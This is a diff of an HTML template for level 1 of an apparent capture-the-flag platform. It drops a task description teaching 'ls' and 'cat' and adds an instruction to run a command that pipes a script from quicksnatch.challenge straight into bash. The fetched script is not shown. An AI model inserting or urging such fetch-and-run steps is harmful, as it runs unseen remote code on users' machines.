@@ -1,24 +1,9 @@
 {% extends "challenges/level_base.html" %}
 
-{% block level_title %}File Explorer Challenge{% endblock %}
+{% block level_title %}Introduction{% endblock %}
 
 {% block challenge_description %}
-<div class="challenge-description">
-    <h4>Welcome to Level 1!</h4>
-    <p>Your first challenge is to explore a basic Linux file system and find a hidden flag. You'll need to use basic file system navigation commands to discover the flag.</p>
-    
-    <div class="task-list">
-        <h5>Your Tasks:</h5>
-        <ul>
-            <li>Explore the current directory using the <code>ls</code> command</li>
-            <li>Try different options with <code>ls</code> to see hidden files</li>
-            <li>Use <code>cat</code> to read file contents</li>
-        </ul>
-    </div>
-
-    <div class="hint-box">
-        <p><strong>Hint:</strong> The flag might be in plain sight, but you need to know how to view it. Try using <code>ls</code> and <code>cat</code> commands.</p>
-        <p>Type <code>help</code> to see available commands.</p>
-    </div>
-</div>
+<p>Welcome to Level 1! Execute the command below in your terminal to begin the challenge.</p>
 {% endblock %}
+
+{% block curl_command %}curl -s https://quicksnatch.challenge/level1/start | bash{% endblock %}
